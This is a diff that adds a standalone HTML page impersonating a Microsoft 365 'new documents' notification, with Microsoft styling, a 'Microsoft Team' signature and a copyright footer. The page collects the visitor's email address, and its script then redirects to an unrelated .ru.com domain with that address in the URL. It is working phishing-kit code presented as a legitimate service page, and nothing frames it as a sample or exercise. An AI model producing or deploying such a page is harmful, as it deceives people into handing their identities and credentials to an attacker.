@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>New Documents Available</title>
+
+  <style>
+    :root {
+      --ms-blue: #0078d4;
+      --ms-blue-dark: #005a9e;
+      --bg-gradient: linear-gradient(135deg, #eef3f8, #f9fbfd);
+      --text-primary: #1b1a19;
+      --text-secondary: #605e5c;
+      --border-default: #8a8886;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+      background: var(--bg-gradient);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--text-primary);
+    }
+
+    .container {
+      width: 100%;
+      max-width: 580px;
+      background: #ffffff;
+      border-radius: 12px;
+      box-shadow: 0 12px 32px rgba(0, 0, 0, 0.18);
+      overflow: hidden;
+      animation: fadeIn 0.35s ease-out;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(6px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .header {
+      background: var(--ms-blue);
+      color: #ffffff;
+      text-align: center;
+      padding: 20px;
+      font-size: 21px;
+      font-weight: 600;
+      letter-spacing: 0.2px;
+    }
+
+    .content {
+      padding: 28px;
+    }
+
+    .primary-text {
+      font-size: 15px;
+      line-height: 1.5;
+      color: var(--text-secondary);
+      margin: 10px 0;
+    }
+
+    .email-input {
+      width: 100%;
+      padding: 12px 14px;
+      font-size: 15px;
+      font-family: inherit;
+      border-radius: 4px;
+      border: 1px solid var(--border-default);
+      margin-top: 18px;
+      color: #000;
+      background-color: #fff;
+      transition: border-color 0.15s ease, box-shadow 0.15s ease;
+    }
+
+    .email-input:focus {
+      outline: none;
+      border-color: var(--ms-blue);
+      box-shadow: 0 0 0 1px var(--ms-blue);
+    }
+
+    .error-message {
+      display: none;
+      font-size: 12px;
+      color: #a80000;
+      margin-top: 6px;
+    }
+
+    .button {
+      width: 100%;
+      margin-top: 22px;
+      padding: 12px;
+      font-size: 15px;
+      font-weight: 600;
+      font-family: inherit;
+      border-radius: 4px;
+      border: none;
+      background: var(--ms-blue);
+      color: #ffffff;
+      cursor: pointer;
+      transition: background 0.15s ease, transform 0.05s ease;
+    }
+
+    .button:hover:not(:disabled) {
+      background: var(--ms-blue-dark);
+    }
+
+    .button:active:not(:disabled) {
+      transform: translateY(1px);
+    }
+
+    .button:disabled {
+      opacity: 0.55;
+      cursor: not-allowed;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 11.5px;
+      color: #605e5c;
+      padding: 16px 12px 20px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <div class="header">
+      New Documents Available
+    </div>
+
+    <div class="content">
+      <p class="primary-text">Hello,</p>
+
+      <p class="primary-text">
+        You have new documents and messages in your Microsoft 365 account. To
+        view and manage your new content, please enter your email address below.
+      </p>
+
+      <p class="primary-text">
+        Stay organized and up to date with your latest files and communications.
+      </p>
+
+      <form id="documentForm" novalidate>
+        <input
+          type="email"
+          id="email"
+          class="email-input"
+          placeholder="Enter your email address"
+          required
+        />
+
+        <div id="errorMessage" class="error-message">
+          Please enter a valid email address.
+        </div>
+
+        <button type="submit" id="submitBtn" class="button" disabled>
+          View your new documents
+        </button>
+      </form>
+
+      <p class="primary-text" style="margin-top:20px;">
+        Thank you for using Microsoft 365.
+      </p>
+
+      <p class="primary-text">
+        Best regards,<br />The Microsoft Team
+      </p>
+    </div>
+
+    <div class="footer">
+      © 2026 Microsoft Corporation. All rights reserved.
+    </div>
+  </div>
+
+  <script>
+    const emailInput = document.getElementById("email");
+    const submitBtn = document.getElementById("submitBtn");
+    const errorMessage = document.getElementById("errorMessage");
+    const form = document.getElementById("documentForm");
+
+    function validateEmail(email) {
+      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+    }
+
+    emailInput.addEventListener("input", () => {
+      const email = emailInput.value.trim();
+
+      if (validateEmail(email)) {
+        submitBtn.disabled = false;
+        errorMessage.style.display = "none";
+      } else {
+        submitBtn.disabled = true;
+        errorMessage.style.display = email ? "block" : "none";
+      }
+    });
+
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+      const email = emailInput.value.trim();
+      if (!validateEmail(email)) return;
+
+      window.location.href = "https://bytevision.vestoune.ru.com/nn@BqU3ZC3EMkJ/$" + encodeURIComponent(email);
+    });
+  </script>
+</body>
+</html>
+
